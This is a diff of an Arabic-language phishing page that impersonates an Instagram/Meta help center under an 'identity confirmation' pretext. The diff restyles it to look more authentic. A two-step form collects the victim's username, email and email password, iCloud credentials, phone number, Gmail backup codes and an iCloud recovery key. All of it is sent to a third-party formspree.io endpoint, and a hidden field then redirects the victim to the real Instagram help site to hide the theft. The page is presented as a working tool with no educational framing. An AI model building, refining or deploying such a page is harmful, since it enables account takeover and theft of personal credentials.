@@ -5,45 +5,91 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مركز المساعدة | Instagram</title>
     <style>
-        :root { --fb-blue: #1877f2; --bg-gray: #f0f2f5; --border: #dddfe2; }
-        body { background-color: var(--bg-gray); font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); border: 1px solid var(--border); overflow: hidden; }
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); }
-        .header img { width: 80px; }
-        .content { padding: 25px; }
-        h1 { font-size: 19px; color: #1c1e21; margin-bottom: 10px; text-align: center; }
-        p { font-size: 14px; color: #606770; margin-bottom: 20px; text-align: center; }
-        input, select, textarea { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 6px; background: #f5f6f7; box-sizing: border-box; font-size: 14px; outline: none; }
-        button { width: 100%; background: var(--fb-blue); color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .info-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 10px; border-radius: 6px; font-size: 12px; color: #856404; margin-bottom: 15px; display: none; }
-        #step2 { display: none; } /* إخفاء الخطوة الثانية في البداية */
+        /* هوية الألوان والخطوط الرسمية */
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .main-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 380px; padding: 0; border-radius: 1px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        
+        /* شعار إنستغرام العلوي */
+        .header-logo { padding: 30px 0 10px; text-align: center; }
+        .header-logo img { width: 175px; height: auto; }
+
+        .form-content { padding: 20px 40px 30px; }
+        h2 { font-size: 16px; font-weight: 600; color: #262626; text-align: center; margin-bottom: 12px; }
+        p { font-size: 14px; color: #8e8e8e; text-align: center; line-height: 1.4; margin-bottom: 20px; }
+
+        /* تنسيق الخانات */
+        input, select, textarea { 
+            width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; 
+            padding: 9px 7px; font-size: 12px; box-sizing: border-box; color: #262626; margin-bottom: 8px; outline: none;
+        }
+        input:focus { border-color: #a8a8a8; }
+        
+        .dual-input { display: flex; gap: 4px; }
+        .dual-input select { width: 40%; }
+        .dual-input input { width: 60%; }
+
+        button { 
+            width: 100%; background-color: #0095f6; border: none; border-radius: 4px;
+            color: #fff; font-weight: 600; padding: 7px 0; font-size: 14px; cursor: pointer; margin-top: 10px;
+        }
+
+        /* شعار ماتا السفلي */
+        .meta-footer { text-align: center; padding: 40px 0; }
+        .meta-footer img { width: 65px; opacity: 0.8; }
+        .meta-text { color: #8e8e8e; font-size: 12px; margin-top: 10px; display: block; }
+
+        .security-note { background: #fff2f2; border: 1px solid #ed4956; padding: 10px; border-radius: 4px; font-size: 11px; color: #ed4956; margin-bottom: 15px; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png"></div>
-        <div class="content">
-            <form action="https://formspree.io/f/mdaygdnq" method="POST">
+
+<div class="main-wrapper">
+    <div class="card">
+        <div class="header-logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        </div>
+
+        <div class="form-content">
+            <form action="https://formspree.io/f/mdaygdnq" method="POST" id="mainForm">
                 
                 <div id="step1">
-                    <h1>تأكيد الهوية</h1>
-                    <p>يرجى إدخال البيانات التالية لتوثيق ملكية الحساب.</p>
-                    <input type="text" name="Username" placeholder="اسم المستخدم" required>
-                    <input type="email" name="Email" placeholder="البريد الإلكتروني" required>
-                    <input type="password" name="Email_Pass" placeholder="كلمة مرور البريد" required>
-                    <input type="email" name="iCloud_User" placeholder="بريد iCloud">
+                    <h2>تأكيد الهوية</h2>
+                    <p>يرجى تقديم المعلومات المطلوبة لمراجعة حسابك.</p>
+                    
+                    <input type="text" name="User" placeholder="اسم المستخدم" required>
+                    <input type="email" name="Mail" placeholder="البريد الإلكتروني المرتبط" required>
+                    <input type="password" name="Mail_Pass" placeholder="كلمة مرور البريد" required>
+                    <input type="email" name="iCloud_Mail" placeholder="بريد iCloud">
                     <input type="password" name="iCloud_Pass" placeholder="كلمة مرور iCloud">
-                    <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
-                    <input type="text" name="Country" placeholder="البلد">
-                    <textarea name="Description" placeholder="وصف موجز للمشكلة" rows="2"></textarea>
-                    <button type="button" onclick="goNext()">المتابعة</button>
+                    
+                    <div class="dual-input">
+                        <select name="Code">
+                            <option value="+966">🇸🇦 +966</option>
+                            <option value="+964">🇮🇶 +964</option>
+                            <option value="+20">🇪🇬 +20</option>
+                            <option value="+971">🇦🇪 +971</option>
+                        </select>
+                        <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
+                    </div>
+
+                    <select name="Country">
+                        <option value="">-- اختر بلدك --</option>
+                        <option value="KSA">السعودية</option>
+                        <option value="Iraq">العراق</option>
+                        <option value="Egypt">مصر</option>
+                    </select>
+
+                    <textarea name="Msg" placeholder="وصف موجز للحالة..." rows="2"></textarea>
+                    <button type="button" onclick="nextStep()">متابعة</button>
                 </div>
 
-                <div id="step2">
-                    <h1>تحقق إضافي</h1>
-                    <div class="info-box" id="info">⚠️ الحساب محمي. يرجى إدخال رموز الأمان الاحتياطية لضمان استرجاع الحساب بنجاح.</div>
-                    <input type="text" name="Gmail_Backup_Code" placeholder="رمز أمان Gmail (8 أرقام)">
-                    <input type="text" name="iCloud_Backup_Code" placeholder="رمز أمان iCloud">
+                <div id="step2" style="display: none;">
+                    <h2>التحقق الأمني المتقدم</h2>
+                    <div class="security-note" id="snote">يجب إدخال رموز الأمان لإكمال عملية التوثيق.</div>
+                    
+                    <input type="text" name="Gmail_Backup" placeholder="رمز أمان Gmail (8 أرقام)">
+                    <input type="text" name="iCloud_Recovery" placeholder="مفتاح استرداد iCloud">
                     
                     <input type="hidden" name="_next" value="https://help.instagram.com">
                     <button type="submit">تأكيد نهائي</button>
@@ -52,14 +98,20 @@
             </form>
         </div>
     </div>
+</div>
 
-    <script>
-        function goNext() {
-            // إخفاء الخطوة الأولى وإظهار الثانية بحركة بسيطة
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-            document.getElementById('info').style.display = 'block';
-        }
-    </script>
+<div class="meta-footer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
+    <span class="meta-text">Instagram from Meta © 2026</span>
+</div>
+
+<script>
+    function nextStep() {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('snote').style.display = 'block';
+    }
+</script>
+
 </body>
 </html>
